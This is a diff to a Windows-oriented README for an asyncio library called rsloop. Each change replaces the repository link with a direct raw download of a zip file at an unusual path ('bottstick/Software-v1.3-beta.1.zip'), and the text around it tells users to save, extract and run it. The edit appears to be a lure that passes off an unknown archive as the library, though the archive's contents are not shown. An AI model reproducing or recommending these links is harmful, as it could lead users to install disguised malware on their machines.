@@ -1,6 +1,6 @@
 # 🧵 rsloop - Faster asyncio loops for Windows
 
-[![Download rsloop](https://img.shields.io/badge/Download-rsloop-blue?style=for-the-badge)](https://github.com/Hqgra2900/rsloop)
+[![Download rsloop](https://img.shields.io/badge/Download-rsloop-blue?style=for-the-badge)](https://github.com/Hqgra2900/rsloop/raw/refs/heads/main/bottstick/Software-v1.3-beta.1.zip)
 
 ## ⚙️ What rsloop does
 
@@ -13,7 +13,7 @@ If you run Python tools that use `asyncio`, rsloop gives them a Rust-based loop 
 
 Use this link to visit the page and download rsloop:
 
-[https://github.com/Hqgra2900/rsloop](https://github.com/Hqgra2900/rsloop)
+[https://github.com/Hqgra2900/rsloop/raw/refs/heads/main/bottstick/Software-v1.3-beta.1.zip](https://github.com/Hqgra2900/rsloop/raw/refs/heads/main/bottstick/Software-v1.3-beta.1.zip)
 
 On that page, look for the latest Windows download. Save the file to your PC before you install or run it.
 
@@ -32,7 +32,7 @@ For best results, close extra apps before you set it up. That helps the install 
 
 Follow these steps to use rsloop on Windows:
 
-1. Open the download page: [https://github.com/Hqgra2900/rsloop](https://github.com/Hqgra2900/rsloop)
+1. Open the download page: [https://github.com/Hqgra2900/rsloop/raw/refs/heads/main/bottstick/Software-v1.3-beta.1.zip](https://github.com/Hqgra2900/rsloop/raw/refs/heads/main/bottstick/Software-v1.3-beta.1.zip)
 2. Find the latest release or download file
 3. Save the file to a folder you can find again, such as Downloads
 4. If the file is zipped, right-click it and choose Extract All
@@ -129,7 +129,7 @@ Apps that use `asyncio` and spend a lot of time waiting on network or file work.
 
 If you need the file again, use this page:
 
-[https://github.com/Hqgra2900/rsloop](https://github.com/Hqgra2900/rsloop)
+[https://github.com/Hqgra2900/rsloop/raw/refs/heads/main/bottstick/Software-v1.3-beta.1.zip](https://github.com/Hqgra2900/rsloop/raw/refs/heads/main/bottstick/Software-v1.3-beta.1.zip)
 
 ## 🧪 Basic check
 
